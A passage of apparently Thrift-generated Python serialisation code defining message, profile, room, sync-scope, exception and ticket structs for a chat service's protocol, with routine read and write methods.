            elif fid == 3:
                if ftype == TType.I32:
                    self.type = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 4:
                if ftype == TType.I32:
                    self.reqSeq = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 5:
                if ftype == TType.STRING:
                    self.checksum = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 7:
                if ftype == TType.I32:
                    self.status = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 10:
                if ftype == TType.STRING:
                    self.param1 = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 11:
                if ftype == TType.STRING:
                    self.param2 = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 12:
                if ftype == TType.STRING:
                    self.param3 = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 20:
                if ftype == TType.STRUCT:
                    self.message = Message()
                    self.message.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('Operation')
        if self.revision is not None:
            oprot.writeFieldBegin('revision', TType.I64, 1)
            oprot.writeI64(self.revision)
            oprot.writeFieldEnd()
        if self.createdTime is not None:
            oprot.writeFieldBegin('createdTime', TType.I64, 2)
            oprot.writeI64(self.createdTime)
            oprot.writeFieldEnd()
        if self.type is not None:
            oprot.writeFieldBegin('type', TType.I32, 3)
            oprot.writeI32(self.type)
            oprot.writeFieldEnd()
        if self.reqSeq is not None:
            oprot.writeFieldBegin('reqSeq', TType.I32, 4)
            oprot.writeI32(self.reqSeq)
            oprot.writeFieldEnd()
        if self.checksum is not None:
            oprot.writeFieldBegin('checksum', TType.STRING, 5)
            oprot.writeString(self.checksum.encode('utf-8') if sys.version_info[0] == 2 else self.checksum)
            oprot.writeFieldEnd()
        if self.status is not None:
            oprot.writeFieldBegin('status', TType.I32, 7)
            oprot.writeI32(self.status)
            oprot.writeFieldEnd()
        if self.param1 is not None:
            oprot.writeFieldBegin('param1', TType.STRING, 10)
            oprot.writeString(self.param1.encode('utf-8') if sys.version_info[0] == 2 else self.param1)
            oprot.writeFieldEnd()
        if self.param2 is not None:
            oprot.writeFieldBegin('param2', TType.STRING, 11)
            oprot.writeString(self.param2.encode('utf-8') if sys.version_info[0] == 2 else self.param2)
            oprot.writeFieldEnd()
        if self.param3 is not None:
            oprot.writeFieldBegin('param3', TType.STRING, 12)
            oprot.writeString(self.param3.encode('utf-8') if sys.version_info[0] == 2 else self.param3)
            oprot.writeFieldEnd()
        if self.message is not None:
            oprot.writeFieldBegin('message', TType.STRUCT, 20)
            self.message.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class Profile(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRING, 'mid', 'UTF8', None, ),  # 1
        None,  # 2
        (3, TType.STRING, 'userid', 'UTF8', None, ),  # 3
        None,  # 4
        None,  # 5
        None,  # 6
        None,  # 7
        None,  # 8
        None,  # 9
        (10, TType.STRING, 'phone', 'UTF8', None, ),  # 10
        (11, TType.STRING, 'email', 'UTF8', None, ),  # 11
        (12, TType.STRING, 'regionCode', 'UTF8', None, ),  # 12
        None,  # 13
        None,  # 14
        None,  # 15
        None,  # 16
        None,  # 17
        None,  # 18
        None,  # 19
        (20, TType.STRING, 'displayName', 'UTF8', None, ),  # 20
        (21, TType.STRING, 'phoneticName', 'UTF8', None, ),  # 21
        (22, TType.STRING, 'pictureStatus', 'UTF8', None, ),  # 22
        (23, TType.STRING, 'thumbnailUrl', 'UTF8', None, ),  # 23
        (24, TType.STRING, 'statusMessage', 'UTF8', None, ),  # 24
        None,  # 25
        None,  # 26
        None,  # 27
        None,  # 28
        None,  # 29
        None,  # 30
        (31, TType.BOOL, 'allowSearchByUserid', None, None, ),  # 31
        (32, TType.BOOL, 'allowSearchByEmail', None, None, ),  # 32
        (33, TType.STRING, 'picturePath', 'UTF8', None, ),  # 33
        (34, TType.STRING, 'musicProfile', 'UTF8', None, ),  # 34
    )

    def __init__(self, mid=None, userid=None, phone=None, email=None, regionCode=None, displayName=None, phoneticName=None, pictureStatus=None, thumbnailUrl=None, statusMessage=None, allowSearchByUserid=None, allowSearchByEmail=None, picturePath=None, musicProfile=None,):
        self.mid = mid
        self.userid = userid
        self.phone = phone
        self.email = email
        self.regionCode = regionCode
        self.displayName = displayName
        self.phoneticName = phoneticName
        self.pictureStatus = pictureStatus
        self.thumbnailUrl = thumbnailUrl
        self.statusMessage = statusMessage
        self.allowSearchByUserid = allowSearchByUserid
        self.allowSearchByEmail = allowSearchByEmail
        self.picturePath = picturePath
        self.musicProfile = musicProfile

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRING:
                    self.mid = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.STRING:
                    self.userid = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 10:
                if ftype == TType.STRING:
                    self.phone = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 11:
                if ftype == TType.STRING:
                    self.email = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 12:
                if ftype == TType.STRING:
                    self.regionCode = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 20:
                if ftype == TType.STRING:
                    self.displayName = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 21:
                if ftype == TType.STRING:
                    self.phoneticName = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 22:
                if ftype == TType.STRING:
                    self.pictureStatus = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 23:
                if ftype == TType.STRING:
                    self.thumbnailUrl = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 24:
                if ftype == TType.STRING:
                    self.statusMessage = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 31:
                if ftype == TType.BOOL:
                    self.allowSearchByUserid = iprot.readBool()
                else:
                    iprot.skip(ftype)
            elif fid == 32:
                if ftype == TType.BOOL:
                    self.allowSearchByEmail = iprot.readBool()
                else:
                    iprot.skip(ftype)
            elif fid == 33:
                if ftype == TType.STRING:
                    self.picturePath = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 34:
                if ftype == TType.STRING:
                    self.musicProfile = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('Profile')
        if self.mid is not None:
            oprot.writeFieldBegin('mid', TType.STRING, 1)
            oprot.writeString(self.mid.encode('utf-8') if sys.version_info[0] == 2 else self.mid)
            oprot.writeFieldEnd()
        if self.userid is not None:
            oprot.writeFieldBegin('userid', TType.STRING, 3)
            oprot.writeString(self.userid.encode('utf-8') if sys.version_info[0] == 2 else self.userid)
            oprot.writeFieldEnd()
        if self.phone is not None:
            oprot.writeFieldBegin('phone', TType.STRING, 10)
            oprot.writeString(self.phone.encode('utf-8') if sys.version_info[0] == 2 else self.phone)
            oprot.writeFieldEnd()
        if self.email is not None:
            oprot.writeFieldBegin('email', TType.STRING, 11)
            oprot.writeString(self.email.encode('utf-8') if sys.version_info[0] == 2 else self.email)
            oprot.writeFieldEnd()
        if self.regionCode is not None:
            oprot.writeFieldBegin('regionCode', TType.STRING, 12)
            oprot.writeString(self.regionCode.encode('utf-8') if sys.version_info[0] == 2 else self.regionCode)
            oprot.writeFieldEnd()
        if self.displayName is not None:
            oprot.writeFieldBegin('displayName', TType.STRING, 20)
            oprot.writeString(self.displayName.encode('utf-8') if sys.version_info[0] == 2 else self.displayName)
            oprot.writeFieldEnd()
        if self.phoneticName is not None:
            oprot.writeFieldBegin('phoneticName', TType.STRING, 21)
            oprot.writeString(self.phoneticName.encode('utf-8') if sys.version_info[0] == 2 else self.phoneticName)
            oprot.writeFieldEnd()
        if self.pictureStatus is not None:
            oprot.writeFieldBegin('pictureStatus', TType.STRING, 22)
            oprot.writeString(self.pictureStatus.encode('utf-8') if sys.version_info[0] == 2 else self.pictureStatus)
            oprot.writeFieldEnd()
        if self.thumbnailUrl is not None:
            oprot.writeFieldBegin('thumbnailUrl', TType.STRING, 23)
            oprot.writeString(self.thumbnailUrl.encode('utf-8') if sys.version_info[0] == 2 else self.thumbnailUrl)
            oprot.writeFieldEnd()
        if self.statusMessage is not None:
            oprot.writeFieldBegin('statusMessage', TType.STRING, 24)
            oprot.writeString(self.statusMessage.encode('utf-8') if sys.version_info[0] == 2 else self.statusMessage)
            oprot.writeFieldEnd()
        if self.allowSearchByUserid is not None:
            oprot.writeFieldBegin('allowSearchByUserid', TType.BOOL, 31)
            oprot.writeBool(self.allowSearchByUserid)
            oprot.writeFieldEnd()
        if self.allowSearchByEmail is not None:
            oprot.writeFieldBegin('allowSearchByEmail', TType.BOOL, 32)
            oprot.writeBool(self.allowSearchByEmail)
            oprot.writeFieldEnd()
        if self.picturePath is not None:
            oprot.writeFieldBegin('picturePath', TType.STRING, 33)
            oprot.writeString(self.picturePath.encode('utf-8') if sys.version_info[0] == 2 else self.picturePath)
            oprot.writeFieldEnd()
        if self.musicProfile is not None:
            oprot.writeFieldBegin('musicProfile', TType.STRING, 34)
            oprot.writeString(self.musicProfile.encode('utf-8') if sys.version_info[0] == 2 else self.musicProfile)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class Room(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRING, 'mid', 'UTF8', None, ),  # 1
        (2, TType.I64, 'createdTime', None, None, ),  # 2
        None,  # 3
        None,  # 4
        None,  # 5
        None,  # 6
        None,  # 7
        None,  # 8
        None,  # 9
        (10, TType.LIST, 'contacts', (TType.STRUCT, [Contact, None], False), None, ),  # 10
        None,  # 11
        None,  # 12
        None,  # 13
        None,  # 14
        None,  # 15
        None,  # 16
        None,  # 17
        None,  # 18
        None,  # 19
        None,  # 20
        None,  # 21
        None,  # 22
        None,  # 23
        None,  # 24
        None,  # 25
        None,  # 26
        None,  # 27
        None,  # 28
        None,  # 29
        None,  # 30
        (31, TType.BOOL, 'notificationDisabled', None, None, ),  # 31
    )

    def __init__(self, mid=None, createdTime=None, contacts=None, notificationDisabled=None,):
        self.mid = mid
        self.createdTime = createdTime
        self.contacts = contacts
        self.notificationDisabled = notificationDisabled

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRING:
                    self.mid = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.I64:
                    self.createdTime = iprot.readI64()
                else:
                    iprot.skip(ftype)
            elif fid == 10:
                if ftype == TType.LIST:
                    self.contacts = []
                    (_etype40, _size37) = iprot.readListBegin()
                    for _i41 in range(_size37):
                        _elem42 = Contact()
                        _elem42.read(iprot)
                        self.contacts.append(_elem42)
                    iprot.readListEnd()
                else:
                    iprot.skip(ftype)
            elif fid == 31:
                if ftype == TType.BOOL:
                    self.notificationDisabled = iprot.readBool()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('Room')
        if self.mid is not None:
            oprot.writeFieldBegin('mid', TType.STRING, 1)
            oprot.writeString(self.mid.encode('utf-8') if sys.version_info[0] == 2 else self.mid)
            oprot.writeFieldEnd()
        if self.createdTime is not None:
            oprot.writeFieldBegin('createdTime', TType.I64, 2)
            oprot.writeI64(self.createdTime)
            oprot.writeFieldEnd()
        if self.contacts is not None:
            oprot.writeFieldBegin('contacts', TType.LIST, 10)
            oprot.writeListBegin(TType.STRUCT, len(self.contacts))
            for iter43 in self.contacts:
                iter43.write(oprot)
            oprot.writeListEnd()
            oprot.writeFieldEnd()
        if self.notificationDisabled is not None:
            oprot.writeFieldBegin('notificationDisabled', TType.BOOL, 31)
            oprot.writeBool(self.notificationDisabled)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class TalkException(TException):
    
    thrift_spec = (
        None,  # 0
        (1, TType.I32, 'code', None, None, ),  # 1
        (2, TType.STRING, 'reason', 'UTF8', None, ),  # 2
        (3, TType.MAP, 'parameterMap', (TType.STRING, 'UTF8', TType.STRING, 'UTF8', False), None, ),  # 3
    )

    def __init__(self, code=None, reason=None, parameterMap=None,):
        self.code = code
        self.reason = reason
        self.parameterMap = parameterMap

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.I32:
                    self.code = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRING:
                    self.reason = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.MAP:
                    self.parameterMap = {}
                    (_ktype45, _vtype46, _size44) = iprot.readMapBegin()
                    for _i48 in range(_size44):
                        _key49 = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                        _val50 = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                        self.parameterMap[_key49] = _val50
                    iprot.readMapEnd()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('TalkException')
        if self.code is not None:
            oprot.writeFieldBegin('code', TType.I32, 1)
            oprot.writeI32(self.code)
            oprot.writeFieldEnd()
        if self.reason is not None:
            oprot.writeFieldBegin('reason', TType.STRING, 2)
            oprot.writeString(self.reason.encode('utf-8') if sys.version_info[0] == 2 else self.reason)
            oprot.writeFieldEnd()
        if self.parameterMap is not None:
            oprot.writeFieldBegin('parameterMap', TType.MAP, 3)
            oprot.writeMapBegin(TType.STRING, TType.STRING, len(self.parameterMap))
            for kiter51, viter52 in self.parameterMap.items():
                oprot.writeString(kiter51.encode('utf-8') if sys.version_info[0] == 2 else kiter51)
                oprot.writeString(viter52.encode('utf-8') if sys.version_info[0] == 2 else viter52)
            oprot.writeMapEnd()
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()
        
class SyncParamMid(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRING, 'mid', 'UTF8', None, ),  # 1
        (2, TType.I32, 'diff', None, None, ),  # 2
        (3, TType.I64, 'revision', None, None, ),  # 3
    )

    def __init__(self, mid=None, diff=None, revision=None,):
        self.mid = mid
        self.diff = diff
        self.revision = revision

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRING:
                    self.mid = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.I32:
                    self.diff = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.I64:
                    self.revision = iprot.readI64()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('SyncParamMid')
        if self.mid is not None:
            oprot.writeFieldBegin('mid', TType.STRING, 1)
            oprot.writeString(self.mid.encode('utf-8') if sys.version_info[0] == 2 else self.mid)
            oprot.writeFieldEnd()
        if self.diff is not None:
            oprot.writeFieldBegin('diff', TType.I32, 2)
            oprot.writeI32(self.diff)
            oprot.writeFieldEnd()
        if self.revision is not None:
            oprot.writeFieldBegin('revision', TType.I64, 3)
            oprot.writeI64(self.revision)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()
        
class SyncParamContact(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRUCT, 'syncParamMid', [SyncParamMid, None], None, ),  # 1
        (2, TType.I32, 'contactStatus', None, None, ),  # 2
    )

    def __init__(self, syncParamMid=None, contactStatus=None,):
        self.syncParamMid = syncParamMid
        self.contactStatus = contactStatus

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRUCT:
                    self.syncParamMid = SyncParamMid()
                    self.syncParamMid.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.I32:
                    self.contactStatus = iprot.readI32()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('SyncParamContact')
        if self.syncParamMid is not None:
            oprot.writeFieldBegin('syncParamMid', TType.STRUCT, 1)
            self.syncParamMid.write(oprot)
            oprot.writeFieldEnd()
        if self.contactStatus is not None:
            oprot.writeFieldBegin('contactStatus', TType.I32, 2)
            oprot.writeI32(self.contactStatus)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()        
        
class SyncRelations(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.BOOL, 'syncAll', None, None, ),  # 1
        (2, TType.LIST, 'syncParamContact', (TType.STRUCT, [SyncParamContact, None], False), None, ),  # 2
        (3, TType.LIST, 'syncParamMid', (TType.STRUCT, [SyncParamMid, None], False), None, ),  # 3
    )

    def __init__(self, syncAll=None, syncParamContact=None, syncParamMid=None,):
        self.syncAll = syncAll
        self.syncParamContact = syncParamContact
        self.syncParamMid = syncParamMid

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.BOOL:
                    self.syncAll = iprot.readBool()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.LIST:
                    self.syncParamContact = []
                    (_etype489, _size486) = iprot.readListBegin()
                    for _i490 in range(_size486):
                        _elem491 = SyncParamContact()
                        _elem491.read(iprot)
                        self.syncParamContact.append(_elem491)
                    iprot.readListEnd()
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.LIST:
                    self.syncParamMid = []
                    (_etype495, _size492) = iprot.readListBegin()
                    for _i496 in range(_size492):
                        _elem497 = SyncParamMid()
                        _elem497.read(iprot)
                        self.syncParamMid.append(_elem497)
                    iprot.readListEnd()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('SyncRelations')
        if self.syncAll is not None:
            oprot.writeFieldBegin('syncAll', TType.BOOL, 1)
            oprot.writeBool(self.syncAll)
            oprot.writeFieldEnd()
        if self.syncParamContact is not None:
            oprot.writeFieldBegin('syncParamContact', TType.LIST, 2)
            oprot.writeListBegin(TType.STRUCT, len(self.syncParamContact))
            for iter498 in self.syncParamContact:
                iter498.write(oprot)
            oprot.writeListEnd()
            oprot.writeFieldEnd()
        if self.syncParamMid is not None:
            oprot.writeFieldBegin('syncParamMid', TType.LIST, 3)
            oprot.writeListBegin(TType.STRUCT, len(self.syncParamMid))
            for iter499 in self.syncParamMid:
                iter499.write(oprot)
            oprot.writeListEnd()
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()
        
class SyncScope(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.BOOL, 'syncProfile', None, None, ),  # 1
        (2, TType.BOOL, 'syncSettings', None, None, ),  # 2
        (3, TType.BOOL, 'syncSticker', None, None, ),  # 3
        (4, TType.BOOL, 'syncThemeShop', None, None, ),  # 4
        None,  # 5
        None,  # 6
        None,  # 7
        None,  # 8
        None,  # 9
        (10, TType.STRUCT, 'contact', [SyncRelations, None], None, ),  # 10
        (11, TType.STRUCT, 'group', [SyncRelations, None], None, ),  # 11
        (12, TType.STRUCT, 'room', [SyncRelations, None], None, ),  # 12
        (13, TType.STRUCT, 'chat', [SyncRelations, None], None, ),  # 13
    )

    def __init__(self, syncProfile=None, syncSettings=None, syncSticker=None, syncThemeShop=None, contact=None, group=None, room=None, chat=None,):
        self.syncProfile = syncProfile
        self.syncSettings = syncSettings
        self.syncSticker = syncSticker
        self.syncThemeShop = syncThemeShop
        self.contact = contact
        self.group = group
        self.room = room
        self.chat = chat

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.BOOL:
                    self.syncProfile = iprot.readBool()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.BOOL:
                    self.syncSettings = iprot.readBool()
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.BOOL:
                    self.syncSticker = iprot.readBool()
                else:
                    iprot.skip(ftype)
            elif fid == 4:
                if ftype == TType.BOOL:
                    self.syncThemeShop = iprot.readBool()
                else:
                    iprot.skip(ftype)
            elif fid == 10:
                if ftype == TType.STRUCT:
                    self.contact = SyncRelations()
                    self.contact.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 11:
                if ftype == TType.STRUCT:
                    self.group = SyncRelations()
                    self.group.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 12:
                if ftype == TType.STRUCT:
                    self.room = SyncRelations()
                    self.room.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 13:
                if ftype == TType.STRUCT:
                    self.chat = SyncRelations()
                    self.chat.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('SyncScope')
        if self.syncProfile is not None:
            oprot.writeFieldBegin('syncProfile', TType.BOOL, 1)
            oprot.writeBool(self.syncProfile)
            oprot.writeFieldEnd()
        if self.syncSettings is not None:
            oprot.writeFieldBegin('syncSettings', TType.BOOL, 2)
            oprot.writeBool(self.syncSettings)
            oprot.writeFieldEnd()
        if self.syncSticker is not None:
            oprot.writeFieldBegin('syncSticker', TType.BOOL, 3)
            oprot.writeBool(self.syncSticker)
            oprot.writeFieldEnd()
        if self.syncThemeShop is not None:
            oprot.writeFieldBegin('syncThemeShop', TType.BOOL, 4)
            oprot.writeBool(self.syncThemeShop)
            oprot.writeFieldEnd()
        if self.contact is not None:
            oprot.writeFieldBegin('contact', TType.STRUCT, 10)
            self.contact.write(oprot)
            oprot.writeFieldEnd()
        if self.group is not None:
            oprot.writeFieldBegin('group', TType.STRUCT, 11)
            self.group.write(oprot)
            oprot.writeFieldEnd()
        if self.room is not None:
            oprot.writeFieldBegin('room', TType.STRUCT, 12)
            self.room.write(oprot)
            oprot.writeFieldEnd()
        if self.chat is not None:
            oprot.writeFieldBegin('chat', TType.STRUCT, 13)
            self.chat.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class ShouldSyncException(TException):
    
    thrift_spec = (
        None,  # 0
        (1, TType.I64, 'syncOpRevision', None, None, ),  # 1
        (2, TType.STRUCT, 'syncScope', [SyncScope, None], None, ),  # 2
        (3, TType.I32, 'syncReason', None, None, ),  # 3
        (4, TType.STRING, 'message', 'UTF8', None, ),  # 4
    )

    def __init__(self, syncOpRevision=None, syncScope=None, syncReason=None, message=None,):
        self.syncOpRevision = syncOpRevision
        self.syncScope = syncScope
        self.syncReason = syncReason
        self.message = message

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.I64:
                    self.syncOpRevision = iprot.readI64()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRUCT:
                    self.syncScope = SyncScope()
                    self.syncScope.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.I32:
                    self.syncReason = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 4:
                if ftype == TType.STRING:
                    self.message = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('ShouldSyncException')
        if self.syncOpRevision is not None:
            oprot.writeFieldBegin('syncOpRevision', TType.I64, 1)
            oprot.writeI64(self.syncOpRevision)
            oprot.writeFieldEnd()
        if self.syncScope is not None:
            oprot.writeFieldBegin('syncScope', TType.STRUCT, 2)
            self.syncScope.write(oprot)
            oprot.writeFieldEnd()
        if self.syncReason is not None:
            oprot.writeFieldBegin('syncReason', TType.I32, 3)
            oprot.writeI32(self.syncReason)
            oprot.writeFieldEnd()
        if self.message is not None:
            oprot.writeFieldBegin('message', TType.STRING, 4)
            oprot.writeString(self.message.encode('utf-8') if sys.version_info[0] == 2 else self.message)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()
        
class Ticket(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRING, 'id', 'UTF8', None, ),  # 1
        None,  # 2
        None,  # 3
        None,  # 4
        None,  # 5
        None,  # 6
        None,  # 7
        None,  # 8
        None,  # 9
        (10, TType.I64, 'expirationTime', None, None, ),  # 10
        None,  # 11
        None,  # 12
        None,  # 13
        None,  # 14
        None,  # 15
        None,  # 16
        None,  # 17
        None,  # 18
        None,  # 19
        None,  # 20
        (21, TType.I32, 'maxUseCount', None, None, ),  # 21
    )

    def __init__(self, id=None, expirationTime=None, maxUseCount=None,):
        self.id = id
        self.expirationTime = expirationTime
        self.maxUseCount = maxUseCount

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRING:
                    self.id = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 10:
                if ftype == TType.I64:
